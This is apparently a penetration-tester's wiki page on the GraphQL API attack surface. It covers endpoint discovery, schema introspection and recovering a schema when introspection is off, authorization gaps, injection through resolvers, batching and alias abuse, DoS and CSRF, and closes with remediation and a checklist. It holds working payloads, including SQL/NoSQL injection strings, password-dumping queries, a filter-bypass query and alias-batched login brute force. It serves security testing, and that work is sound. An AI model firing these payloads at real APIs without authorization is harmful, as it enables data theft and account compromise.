---
type: target
title: GraphQL API attack surface
lang: en
status: active
wstg: ["WSTG-APIT-99"]
owasp_top10: []
owasp_api: ["API1:2023", "API5:2023"]
asvs: ["V4.3.1", "V4.3.2"]
cwe: []
attack: []
cvss: ""
sources: [payloadsallthethings, hacktricks, colleague-web-wiki]
updated: 2026-09-17
---

# GraphQL API attack surface

A GraphQL API exposes **one endpoint** with a typed schema; the client shapes the query. Some
surface is unique (introspection, batching, nesting DoS, alias bypass); much is generic
injection reached *through* the resolver. Pair with the run-book [[api-testing]] and the REST
sibling [[rest-api]].

## Recon — find & fingerprint the endpoint

Common paths: `/graphql`, `/graphiql`, `/api/graphql`, `/v1/graphql`, `/graphql/console`,
`/graphql.php`, `/graph`, `/api`. Wordlist: SecLists `Discovery/Web-Content/graphql.txt`.

```graphql
query{__typename}          # a GraphQL endpoint replies {"data":{"__typename":"Query"}}
```
Delivery matters: many servers accept `POST` JSON, `GET ?query=…`, and form-urlencoded — the last
two often skip CSRF/WAF checks. Fingerprint the engine with **graphw00f**.

## Introspection — dump the schema

The single biggest win: the schema lists every type, field, argument, and mutation.

```graphql
{ __schema { queryType { name } mutationType { name } types { name fields { name } } } }
```
Full introspection (feed the JSON to **GraphQL Voyager** to visualise):

```graphql
query IntrospectionQuery {
  __schema {
    queryType { name } mutationType { name } subscriptionType { name }
    types { ...FullType }
    directives { name args { ...InputValue } }
  }
}
fragment FullType on __Type {
  kind name
  fields(includeDeprecated: true) { name args { ...InputValue } type { ...TypeRef } }
  inputFields { ...InputValue } interfaces { ...TypeRef }
  enumValues(includeDeprecated: true) { name } possibleTypes { ...TypeRef }
}
fragment InputValue on __InputValue { name type { ...TypeRef } defaultValue }
fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name } } } }
```
Enumerate one type:

```graphql
{ __type(name:"User") { name fields { name type { name kind ofType { name kind } } } } }
```

### Introspection disabled → recover the schema anyway

- **Field suggestions** — an unknown field returns `Did you mean "users"?`; harvest names.
  Automate with **Clairvoyance** (rebuilds the schema from suggestions + a wordlist).
- **Filter bypass** — a regex that blocks bare `__schema` is beaten by whitespace/newline after it,
  or by switching to `GET`/form-urlencoded, or over a `graphql-ws` WebSocket.
  ```json
  {"query":"query{__schema\n{queryType{name}}}"}
  ```
- **Persisted queries aren't a safelist** — send the hash; on `PersistedQueryNotFound`, resend the
  full `query` — many Apollo deployments then run arbitrary operations.

## Authorization gaps (BOLA / BFLA per resolver)

GraphQL enforces **no** authz by default — each resolver must check. Tamper id arguments
([[idor|IDOR/BOLA]]); dump everything with an empty filter; invoke privileged mutations
([[rest-api|BFLA]]).

```graphql
{ user(uid: 1) { username email password } }          # increment uid across accounts
{ users(search: "") { id username password } }         # empty search dumps all
```

## Injection through resolvers

The resolver forwards args to a backend, so classic injection applies —
[[sql-injection|SQLi]], NoSQLi, [[command-injection|command injection]], reflected
[[xss|XSS]] in error messages, [[ssrf|SSRF]] via URL args.

```graphql
{ product(id: "1'") { id name } }                                  # SQLi probe (error/where clause)
{ user(name: "x';SELECT pg_sleep(5);-- -") { id } }                # time-based SQLi through the arg
{ doctors(filter: "{\"ssn\":{\"$regex\":\".*\"}}") { patients { ssn } } }   # NoSQL $regex dump
```

## Batching & aliasing (rate-limit / brute-force / MFA bypass)

Send many operations in one HTTP request — bypasses per-request rate limits and monitoring.

```graphql
mutation {
  a: login(user: "bob", pass: "1111") { token }
  b: login(user: "bob", pass: "2222") { token }
  c: login(user: "bob", pass: "3333") { token }
}
```
Array batching: `[{"query":"…"},{"query":"…"}]`. Alias an operation to dodge a name blocklist
(`s: adminUsers { … }`).

## DoS & CSRF

- **DoS** — deeply nested recursive queries (`A{B{A{B…}}}`), alias/field duplication, directive
  overloading. Get written approval before firing.
- **CSRF** — endpoints accepting `GET` or form-urlencoded bodies lack preflight; multipart
  `Upload` mutations are "simple requests" (cross-origin without preflight). Cross-site WebSocket
  hijacking when auth rides on cookies. See [[csrf]] / [[cors-misconfiguration]].

## Tooling

**graphw00f** (fingerprint), **InQL** / **GraphQL Raider** (Burp), **Clairvoyance** (schema
recovery), **GraphQLmap**, **graphql-cop**, **GraphQL Voyager** (visualise), **batchql**.

## Remediation

Disable introspection **and** field suggestions and GraphiQL in prod; enforce **object/field-level
authorization inside every resolver** (aliases defeat name blocklists); depth/complexity/cost
limits + pagination caps + timeouts + batching limits; typed scalars/`input` validation;
parameterised backend queries; generic errors. (Control set: [[colleague-web-wiki|graphql-security]].)

## Quick checklist

- [ ] Locate the endpoint (`__typename` probe); try GET / form-urlencoded / WebSocket delivery.
- [ ] Introspect the schema; disabled → field suggestions / Clairvoyance / persisted-query bypass.
- [ ] Per resolver: BOLA (swap ids), BFLA (privileged mutations), injection (SQLi/NoSQL/SSRF in args).
- [ ] Batch/alias to bypass rate limits & MFA; test nesting DoS (with approval).
- [ ] Confirm: unauthorized data read/modified, or an auth/rate-limit control bypassed.

## See also

[[rest-api]] · [[api-testing]] · [[idor]] · [[sql-injection]] · [[ssrf]] · [[csrf]]

*Sources: [[payloadsallthethings]] + [[hacktricks]] (introspection/batching/injection payloads, tooling); [[colleague-web-wiki]] (WSTG-APIT-99 framing, graphql-security remediation).*
